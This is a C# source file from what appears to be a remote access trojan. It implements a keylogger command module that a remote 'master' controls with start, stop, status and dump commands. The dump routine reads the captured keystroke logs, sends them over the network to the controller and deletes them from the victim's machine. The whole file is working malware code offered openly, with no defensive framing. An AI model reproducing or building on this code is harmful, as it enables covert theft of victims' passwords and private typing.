using System;
using Shared;
using Slave.Commands.Core;
using System.Collections.Generic;
using System.IO;

namespace Slave.Commands.KeyLogger
{
    internal class KeyLoggerCommand : ICommand
    {
        public string name { get; } = "keylogger";

        public KeyLoggerManager keyLoggerManager { get; set; }

        public void Process(List<string> args)
        {
            if (keyLoggerManager == null)
                keyLoggerManager = new KeyLoggerManager();

            switch (args[0])
            {
                case "start":
                    StartKeylogger();
                    break;
                case "stop":
                    StopKeylogger();
                    break;
                case "status":
                    SendKeyloggerStatusToMaster();
                    break;
                case "dump":
                    SendKeyLogsToMaster();
                    break;
            }
        }

        void StartKeylogger()
        {
            keyLoggerManager.StartListening();
            SendKeyloggerStatusToMaster();
        }

        void StopKeylogger()
        {
            keyLoggerManager.StopListening();
            SendKeyloggerStatusToMaster();
        }

        void SendKeyloggerStatusToMaster() =>
            SlaveCommandsManager.networkManager.WriteLine(keyLoggerManager.GetStatus() ? "on" : "off");

        void SendKeyLogsToMaster()
        {
            // Need to stop the logging into files to prevent IO exceptions
            keyLoggerManager.StopFileLogging();
            var logFiles = keyLoggerManager.GetLogFilesPath();
            foreach (var file in logFiles)
            {
                var fileName = file.Substring(file.LastIndexOf('\\') + 1);
                GlobalCommandsManager.networkManager.WriteLine(fileName);
                try
                {
                    GlobalCommandsManager.networkManager.WriteLine(File.ReadAllText(file));
                    File.Delete(file);
                }
                catch (IOException)
                {
                    // Couldn't read file : send error
                    GlobalCommandsManager.networkManager.WriteLine($"KO:{fileName}");
                }
            }
            GlobalCommandsManager.networkManager.WriteLine("{end}");

            keyLoggerManager.StartFileLogging();
        }
    }
}
